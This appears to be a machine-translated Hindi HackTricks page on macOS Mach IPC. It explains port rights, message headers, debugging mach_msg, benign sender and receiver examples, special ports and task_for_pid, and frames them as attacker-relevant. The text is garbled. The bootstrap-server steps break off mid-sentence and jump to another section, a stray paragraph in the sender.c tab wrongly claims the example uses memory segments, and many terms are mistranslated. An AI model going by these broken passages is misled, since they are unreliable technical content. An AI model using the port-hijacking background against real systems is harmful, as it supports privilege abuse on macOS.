# macOS IPC - इंटर प्रोसेस कम्यूनिकेशन

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर हमें **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, **HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

## पोर्ट के माध्यम से Mach संदेश

### मौलिक जानकारी

Mach **कार्यों** का उपयोग संसाधन साझा करने के लिए **सबसे छोटी इकाई** के रूप में करता है, और प्रत्येक कार्य में **कई धागे** हो सकते हैं। ये **कार्य और धागे 1:1 मैप किए गए हैं POSIX प्रक्रियाओं और धागों के साथ**।

कार्यों के बीच संचार Mach इंटर-प्रोसेस कम्यूनिकेशन (IPC) के माध्यम से होता है, जो एक-तरफा संचार चैनल का उपयोग करता है। **संदेश पोर्टों के बीच स्थानांतरित किए जाते हैं**, जो कर्नेल द्वारा प्रबंधित **संदेश कतारों** की तरह कार्य करते हैं।

**पोर्ट** Mach IPC का **मौलिक** तत्व है। इसका उपयोग **संदेश भेजने और प्राप्त करने** के लिए किया जा सकता है।

प्रत्येक प्रक्रिया के पास एक **IPC तालिका** होती है, जिसमें प्रक्रिया के **mach पोर्ट** मिल सकते हैं। मैच पोर्ट का नाम वास्तव में एक संख्या है (कर्नेल ऑब्जेक्ट के लिए एक पॉइंटर)।

एक प्रक्रिया एक पोर्ट नाम को कुछ अधिकारों के साथ **एक विभिन्न कार्य** को भेज सकती है और कर्नेल इसे **दूसरे कार्य की IPC तालिका में इस प्रविष्टि को दिखाएगा**।

### पोर्ट अधिकार

पोर्ट अधिकार, जो यह निर्धारित करते हैं कि एक कार्य किस कार्रवाई कर सकता है, इस संचार के लिए महत्वपूर्ण हैं। संभावित **पोर्ट अधिकार** हैं ([यहाँ से परिभाषाएँ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **प्राप्ति अधिकार**, जो पोर्ट को भेजे गए संदेश प्राप्त करने की अनुमति देता है। Mach पोर्ट MPSC (एकाधिक उत्पादक, एकल-उपभोक्ता) कतारें हैं, जिसका मतलब है कि पूरे सिस्टम में हर पोर्ट के लिए केवल **एक प्राप्ति अधिकार हो सकता है** (जैसे कि पाइप्स में, जहां कई प्रक्रियाएं सभी एक पाइप के पढ़ने के लिए फ़ाइल डिस्क्रिप्टर्स को धारण कर सकती हैं)।
* **प्राप्ति अधिकार वाला** एक कार्य संदेश प्राप्त कर सकता है और **भेजने के अधिकार बना सकता है**, जिससे उसे संदेश भेजने की अनुमति मिलती है। मूल रूप से केवल **अपने कार्य के पास अपने पोर्ट पर प्राप्ति अधिकार होता है**।
* अगर प्राप्ति अधिकार का मालिक **मर जाता है** या उसे मार देता है, तो **भेजने का अधिकार अनर्थक (मरा नाम) हो जाता है**।
* **भेजने का अधिकार**, जो पोर्ट को संदेश भेजने की अनुमति देता है।
* भेजने का अधिकार **क्लोन** किया जा सकता है ताकि भेजने का अधिकार रखने वाला एक कार्य अधिकार को क्लोन कर सके और इसे तीसरे कार्य को **प्रदान** कर सके।
* ध्यान दें कि **पोर्ट अधिकार** Mac संदेश के माध्यम से भी **पारित** किए जा सकते हैं।
* **एक बार भेजने का अधिकार**, जो पोर्ट को एक संदेश भेजने की अनुमति देता है और फिर गायब हो जाता है।
* यह अधिकार **क्लोन नहीं** किया जा सकता है, लेकिन इसे **हटाया** जा सकता है।
* **पोर्ट सेट अधिकार**, जो एक _पोर्ट सेट_ को दर्शाता है बल्कि एक एकल पोर्ट। पोर्ट सेट से संदेश को डीक्यू करने से यह उसमें शामिल पोर्टों में से एक से संदेश को डीक्यू करता है। पोर्ट सेट का उपयोग कई पोर्टों पर सुनने के लिए किया जा सकता है, Unix में `select`/`poll`/`epoll`/`kqueue` की तरह।
* **मरा नाम**, जो वास्तव में एक पोर्ट अधिकार नहीं है, बल्कि केवल एक प्लेसहोल्डर है। जब एक पोर्ट नष्ट होता है, तो पोर्ट के सभी मौजूदा पोर्ट अधिकार मरे नाम में बदल जाते हैं।

**कार्य SEND अधिकार को दूसरों को स्थानांतरित कर सकते हैं**, जिससे उन्हें संदेश वापस भेजने की अनुमति मिलती है। **SEND अधिकार को क्लोन भी किया जा सकता है**, इसलिए एक कार्य एक अधिकार को डुप्लिकेट कर सकता है और इसे तीसरे कार्य को दे सकता है। इसके साथ, एक मध्यस्थ प्रक्रिया जिसे **बूटस्ट्रैप सर्वर** के रूप में जाना जाता है, कार्यों के बीच प्रभावी संचार की अनुमति देता है।

### फाइल पोर्ट

फाइल पोर्ट फाइल डिस्क्रिप्टर्स को Mac पोर्ट में बंधने की अनुमति देते हैं (Mach पोर्ट अधिकार का उपयोग करके)। `fileport_makeport` का उपयोग करके दिए गए FD से `fileport` बनाना संभव है और `fileport_makefd` का उपयोग करके फाइलपोर्ट से एक FD बनाना संभव है।

### संचार स्थापित करना

पहले से किसी अधिकार के बिना एक अधिकार भेजना संभव नहीं है, इसलिए, पहली संचार कैसे स्थापित की जाती है?

इसके लिए, **बूटस्ट्रैप सर्वर** (**मैक में लॉन्चडी** है) शामिल है, क्योंकि **हर कोई बूटस्ट्रैप सर्वर को भेजने का अधिकार प्राप्त कर सकता है**, इसलिए इससे किसी अन्य प्रक्रिया को संदेश भेजने के लिए अधिकार मांग सकते हैं:

1. कार्य **A** एक **नया पोर्ट बनाता है**, जिसे उसके पास **प्राप्ति अधिकार** होता है।
2. कार्य **A**, प्राप्ति अधिकार के धारक होने के नाते, **पोर्ट के लिए भेजने का अधिकार उत्पन्न करता है**।
3. कार्य **A** बूट
### एक Mach संदेश

[यहाँ अधिक जानकारी पाएं](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` फ़ंक्शन, मुख्य रूप से एक सिस्टम कॉल है, Mach संदेश भेजने और प्राप्त करने के लिए उपयोग किया जाता है। इस फ़ंक्शन को संदेश को पहले तर्क के रूप में भेजा जाना चाहिए। इस संदेश को `mach_msg_header_t` संरचना से आरंभ करना चाहिए, जिसके बाद वास्तविक संदेश सामग्री होती है। संरचना निम्नलिखित रूप में परिभाषित की जाती है:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
प्रक्रियाएँ जिनके पास एक _**प्राप्ति अधिकार**_ हैं, वे Mach पोर्ट पर संदेश प्राप्त कर सकती हैं। उल्टे, **भेजने वाले** को एक _**भेजने**_ या _**एक बार भेजने का अधिकार**_ प्रदान किया जाता है। एक बार भेजने का अधिकार केवल एक संदेश भेजने के लिए है, उसके बाद यह अमान्य हो जाता है।

प्रारंभिक फ़ील्ड **`msgh_bits`** एक बिटमैप है:

* पहला बिट (सबसे महत्वपूर्ण) यह दर्शाता है कि एक संदेश जटिल है (इसके बारे में नीचे अधिक)
* तीसरा और चौथा कर्नेल द्वारा उपयोग किया जाता है
* दूसरे बाइट के **5 सबसे कम महत्वपूर्ण बिट** का उपयोग **वाउचर** के लिए किया जा सकता है: एक और प्रकार का पोर्ट कुंजी/मान संयोजन भेजने के लिए।
* तीसरे बाइट के **5 सबसे कम महत्वपूर्ण बिट** का उपयोग **स्थानीय पोर्ट** के लिए किया जा सकता है
* चौथे बाइट के **5 सबसे कम महत्वपूर्ण बिट** का उपयोग **दूरस्थ पोर्ट** के लिए किया जा सकता है

वाउचर, स्थानीय और दूरस्थ पोर्ट में निर्दिष्ट किए जा सकने वाले प्रकार हैं (से [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
उदाहरण के लिए, `MACH_MSG_TYPE_MAKE_SEND_ONCE` का उपयोग **सूचित** करने के लिए किया जा सकता है कि इस पोर्ट के लिए एक **एक-बार-भेजें** **अधिकार** को उत्पन्न और स्थानांतरित किया जाना चाहिए। इसे `MACH_PORT_NULL` को निर्दिष्ट किया जा सकता है ताकि प्राप्तकर्ता को जवाब देने की क्षमता न हो।

एक सरल **द्विदिशीय संचार** प्राप्त करने के लिए एक प्रक्रिया मशीन **संदेश हेडर** में एक _उत्तर पोर्ट_ (**`msgh_local_port`**) निर्दिष्ट कर सकती है जहां संदेश का प्राप्तकर्ता इस संदेश का उत्तर भेज सकता है।

{% hint style="success" %}
ध्यान दें कि इस प्रकार के द्विदिशीय संचार का उपयोग एक्सपीसी संदेशों में किया जाता है जो एक प्रतिक्रिया की उम्मीद रखते हैं (`xpc_connection_send_message_with_reply` और `xpc_connection_send_message_with_reply_sync`)। लेकिन **आम तौर पर विभिन्न पोर्ट बनाए जाते हैं** जैसा पहले स्पष्ट किया गया है ताकि द्विदिशीय संचार बनाया जा सके।
{% endhint %}

संदेश हेडर के अन्य फ़ील्ड हैं:

- `msgh_size`: पूरे पैकेट का आकार।
- `msgh_remote_port`: जिस पोर्ट पर यह संदेश भेजा गया है।
- `msgh_voucher_port`: [मश वाउचर](https://robert.sesek.com/2023/6/mach\_vouchers.html)।
- `msgh_id`: इस संदेश का आईडी, जिसे प्राप्तकर्ता द्वारा व्याख्या किया जाता है।

{% hint style="danger" %}
ध्यान दें कि **मश संदेश** एक `मश पोर्ट` के माध्यम से भेजे जाते हैं, जो मश कर्नल में बनाया गया एक **एकल प्राप्तकर्ता**, **एकाधिक भेजने वाला** संचार चैनल है। **एकाधिक प्रक्रियाएँ** एक मश पोर्ट को संदेश भेज सकती हैं, लेकिन किसी भी समय केवल **एक प्रक्रिया** इसे पढ़ सकती है।
{% endhint %}

उसके बाद संदेश **`mach_msg_header_t`** हेडर द्वारा और **बॉडी** द्वारा और **ट्रेलर** (यदि कोई) द्वारा बनाए जाते हैं और इसे उत्तर देने की अनुमति दे सकते हैं। इन मामलों में, कर्नल को सिर्फ एक कार्य से दूसरे कार्य तक संदेश पारित करने की आवश्यकता होती है।

एक **ट्रेलर** एक **संदेश में कर्नल द्वारा जोड़ी गई जानकारी** है (उपयोगकर्ता द्वारा सेट नहीं की जा सकती) जिसे संदेश प्राप्ति में फ्लैग `MACH_RCV_TRAILER_<trailer_opt>` के साथ अनुरोध किया जा सकता है (यहां विभिन्न जानकारी अनुरोध की जा सकती है)।

#### जटिल संदेश

हालांकि, अन्य अधिक **जटिल** संदेश हैं, जैसे अतिरिक्त पोर्ट अधिकार या साझा मेमोरी पास करने वाले, जहां कर्नल को भी इन वस्तुओं को प्राप्तकर्ता को भेजने की आवश्यकता होती है। इस मामले में हेडर `msgh_bits` का सबसे महत्वपूर्ण बिट सेट किया जाता है।

पारित करने के लिए संभावित वर्णन [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) में परिभाषित हैं:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### Mac Ports APIs

नोट करें कि पोर्ट्स को टास्क नेमस्पेस से जुड़ा होता है, इसलिए पोर्ट बनाने या खोजने के लिए, टास्क नेमस्पेस भी क्वेरी किया जाता है (अधिक जानकारी `mach/mach_port.h` में):

- **`mach_port_allocate` | `mach_port_construct`**: एक पोर्ट बनाएं।
- `mach_port_allocate` एक **पोर्ट सेट** भी बना सकता है: एक समूह के पोर्ट्स पर प्राप्ति अधिकार। जब भी एक संदेश प्राप्त होता है, तो इसमें संकेतित किया जाता है कि संदेश किस पोर्ट से आया था।
- `mach_port_allocate_name`: पोर्ट का नाम बदलें (डिफ़ॉल्ट रूप से 32 बिट पूर्णांक)
- `mach_port_names`: एक लक्ष्य से पोर्ट नाम प्राप्त करें
- `mach_port_type`: एक नाम पर टास्क के अधिकार प्राप्त करें
- `mach_port_rename`: एक पोर्ट का नाम बदलें (जैसे FDs के लिए dup2)
- `mach_port_allocate`: एक नया प्राप्ति, पोर्ट सेट या DEAD_NAME आवंटित करें
- `mach_port_insert_right`: उस पोर्ट में एक नया अधिकार बनाएं जिस पर आपके पास प्राप्ति है
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **mach संदेश भेजने और प्राप्त करने** के लिए उपयोग किए जाने वाले फ़ंक्शन। ओवरराइट संस्करण एक विभिन्न बफ़र को संदेश प्राप्ति के लिए निर्दिष्ट करने की अनुमति देता है (दूसरा संस्करण इसे बस पुनः उपयोग करेगा)।

### Debug mach\_msg

जैसे ही फ़ंक्शन **`mach_msg`** और **`mach_msg_overwrite`** को संदेश भेजने और प्राप्त करने के लिए उपयोग किया जाता है, उन पर ब्रेकपॉइंट सेट करने से भेजे गए और प्राप्त किए गए संदेशों की जांच की जा सकती है।

उदाहरण के लिए किसी भी एप्लिकेशन को डीबग करना शुरू करें जिसे आप डीबग कर सकते हैं क्योंकि यह **`libSystem.B` लोड करेगा जो इस फ़ंक्शन का उपयोग करेगा**।
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
विनिर्देशिकाओं से मान प्राप्त करें:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
मैसेज हेडर की जांच करें और पहले आर्ग्यूमेंट की जांच करें:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
ऐसे प्रकार का `mach_msg_bits_t` एक उत्तर की अनुमति देने के लिए बहुत सामान्य है।



### द्वारों की गणना
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**नाम** पोर्ट का डिफ़ॉल्ट नाम है (जांचें कि पहले 3 बाइट में कैसे **बढ़ रहा** है)। **`ipc-object`** पोर्ट की **अविवादित** अद्वितीय **पहचानकर्ता** है।
ध्यान दें कि केवल **`send`** अधिकार वाले पोर्ट के स्वामी की पहचान कैसे की जा रही है (पोर्ट नाम + pid)।
यहाँ ध्यान दें कि **`+`** का उपयोग **उसी पोर्ट से जुड़े अन्य कार्यों** को दर्शाने के लिए किया जा रहा है।

[**procesxp**](https://www.newosxbook.com/tools/procexp.html) का उपयोग करके भी **पंजीकृत सेवा नामों** (SIP अक्षम होने के कारण `com.apple.system-task-port` की आवश्यकता होने पर) देखना संभव है:
```
procesp 1 ports
```
आप इस टूल को iOS में इंस्टॉल कर सकते हैं इसे [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) से डाउनलोड करके।

### कोड उदाहरण

नोट करें कि **भेजने वाला** **एक पोर्ट आवंटित** करता है, `org.darlinghq.example` नाम के लिए **एक भेजने का हक** बनाता है और इसे **बूटस्ट्रैप सर्वर** को भेजता है जबकि भेजने वाला उस नाम के **भेजने का हक** के लिए अनुरोध करता है और इसका उपयोग **संदेश भेजने** के लिए करता है।

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}हम एक उदाहरण देखेंगे जिसमें एक प्रोसेस एक अन्य प्रोसेस को IPC द्वारा संदेश भेजता है। इसके लिए हम एक सेंडर और रिसीवर प्रोग्राम बनाएंगे। सेंडर प्रोग्राम एक मैसेज भेजेगा और रिसीवर प्रोग्राम उस मैसेज को प्राप्त करेगा। इसके लिए हम IPC में मेमोरी सेगमेंट का उपयोग करेंगे। %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

## विशेष बंदरगाह

कुछ विशेष बंदरगाह हैं जो किसी कार्यों को **कुछ संवेदनशील कार्रवाई करने या कुछ संवेदनशील डेटा तक पहुंचने** की अनुमति देते हैं यदि उन पर **SEND** अनुमतियाँ हो। इससे इन बंदरगाहों को हमलावर की दृष्टि से बहुत दिलचस्प बनाता है न केवल क्षमताओं के कारण बल्कि इसलिए क्योंकि **कार्यों के बीच SEND अनुमतियों को साझा किया जा सकता है**।

### मेजबान विशेष बंदरगाह

ये बंदरगाह एक संख्या द्वारा प्रतिनिधित किए जाते हैं।

**SEND** अधिकार प्राप्त करने के लिए **`host_get_special_port`** को बुलाकर और **RECEIVE** अधिकारों को बुलाकर **`host_set_special_port`** को बुलाकर प्राप्त किया जा सकता है। हालांकि, दोनों कॉल्स को **`host_priv`** बंदरगाह की आवश्यकता है जिसको केवल रूट तक पहुंच होती है। इसके अतिरिक्त, पिछले में रूट को **`host_set_special_port`** बुलाने और अवशेष को हाइजैक करने की अनुमति थी जिससे कोड हस्ताक्षरों को उलटा सकता था जैसे `HOST_KEXTD_PORT` को हाइजैक करके (SIP अब इसे रोकता है)।

ये 2 समूहों में विभाजित हैं: **पहले 7 बंदरगाह कर्नेल के स्वामित्व में हैं** जिसमें 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT` और 7 `HOST_MAX_SPECIAL_KERNEL_PORT` हैं।\
**8 से** शुरू होने वाले वे **सिस्टम डेमन्स के स्वामित्व में हैं** और उन्हें [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) में घोषित किया जा सकता है।

* **मेजबान बंदरगाह**: यदि किसी प्रक्रिया के पास इस बंदरगाह पर **SEND** विशेषाधिकार हैं तो वह इसके रूटीन को बुलाकर **सिस्टम** के बारे में **जानकारी** प्राप्त कर सकती है जैसे:
* `host_processor_info`: प्रोसेसर जानकारी प्राप्त करें
* `host_info`: मेजबान जानकारी प्राप्त करें
* `host_virtual_physical_table_info`: वर्चुअल/फिजिकल पेज टेबल (MACH\_VMDEBUG की आवश्यकता है)
* `host_statistics`: मेजबान सांख्यिकी प्राप्त करें
* `mach_memory_info`: कर्नेल मेमोरी लेआउट प्राप्त करें
* **मेजबान निजी बंदरगाह**: इस बंदरगाह पर **SEND** अधिकार वाली प्रक्रिया **विशेषाधिकारी कार्रवाई** कर सकती है जैसे बूट डेटा दिखाना या कर्नेल एक्सटेंशन लोड करने का प्रयास करना। **प्रक्रिया को रूट होना चाहिए** इस अनुमति को प्राप्त करने के लिए।
* इसके अतिरिक्त, **`kext_request`** API को बुलाने के लिए अन्य entitlements **`com.apple.private.kext*`** की आवश्यकता है जो केवल Apple binaries को दिया जाता है।
* अन्य रूटीन जो बुलाए जा सकते हैं:
* `host_get_boot_info`: `machine_boot_info()` प्राप्त करें
* `host_priv_statistics`: विशेषाधिकारी सांख्यिकी प्राप्त करें
* `vm_allocate_cpm`: एकसंघटित फिजिकल मेमोरी आवंटित करें
* `host_processors`: मेजबान प्रोसेसर्स को भेजें
* `mach_vm_wire`: मेमोरी को रहने वाला बनाएं
* क्योंकि **रूट** इस अनुमति तक पहुंच सकता है, यह हो सकता है कि वह `host_set_[special/exception]_port[s]` को बुलाकर **मेजबान विशेष या अवशेष बंदरगाहों को हाइजैक** करें।

इन सभी मेजबान विशेष बंदरगाहों को देखना संभव है द्वारा चलाकर:
```bash
procexp all ports | grep "HSP"
```
### कार्य विशेष पोर्ट

ये पोर्ट विशेष सेवाओं के लिए आरक्षित हैं। इन्हें `task_[get/set]_special_port` को बुलाकर प्राप्त/सेट किया जा सकता है। इन्हें `task_special_ports.h` में पाया जा सकता है:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
From [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):

* **TASK\_KERNEL\_PORT**\[task-self send right]: यह पोर्ट इस टास्क को नियंत्रित करने के लिए उपयोग किया जाता है। इस्तेमाल किया जाता है मैसेजेस भेजने के लिए जो इस टास्क को प्रभावित करते हैं। यह पोर्ट **mach\_task\_self (नीचे देखें Task Ports)** द्वारा वापस किया जाता है।
* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: टास्क का bootstrap पोर्ट। इस्तेमाल किया जाता है अन्य सिस्टम सेवा पोर्ट की वापसी के लिए मैसेजेस भेजने के लिए।
* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: इसमें आवासी आवाज की जानकारी का अनुरोध करने के लिए उपयोग किया जाता है। यह पोर्ट **mach\_host\_self** द्वारा वापस किया जाता है।
* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: इस टास्क को उसकी वायर्ड कर्नेल मेमोरी से जोड़ने के लिए स्रोत का नामकरण करने वाला पोर्ट।
* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: इस टास्क को उसकी डिफ़ॉल्ट मेमोरी मैनेज्ड मेमोरी से जोड़ने के लिए स्रोत का नामकरण करने वाला पोर्ट।

### Task Ports

मूल रूप से Mach में "प्रक्रियाएँ" नहीं थीं, उसमें "टास्क" था जिसे धागों के एक डिब्बे के रूप में अधिक माना गया था। जब Mach को BSD के साथ मिलाया गया तो **हर टास्क को एक BSD प्रक्रिया से संबंधित माना गया**। इसलिए हर BSD प्रक्रिया के पास उसे प्रक्रिया बनाने के लिए आवश्यक विवरण होता है और हर Mach टास्क के भी अपने अंदर काम करने की क्षमताएँ होती हैं (केवल अस्थितिग्रस्त pid 0 के लिए जो `kernel_task` है के लिए).

इसके साथ दो बहुत दिलचस्प फ़ंक्शन हैं:

* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: निर्दिष्ट `pid` द्वारा संबंधित टास्क के लिए टास्क पोर्ट के लिए एक SEND राइट प्राप्त करें और इसे निर्दिष्ट `target_task_port` को दें (जो सामान्यत: कॉलर टास्क होता है जिसने `mach_task_self()` का उपयोग किया है, लेकिन एक अलग टास्क पर एक SEND पोर्ट हो सकता है।)
* `pid_for_task(task, &pid)`: एक टास्क के लिए एक SEND राइट के द्वारा दिया गया, इस टास्क से संबंधित PID का पता लगाएं।

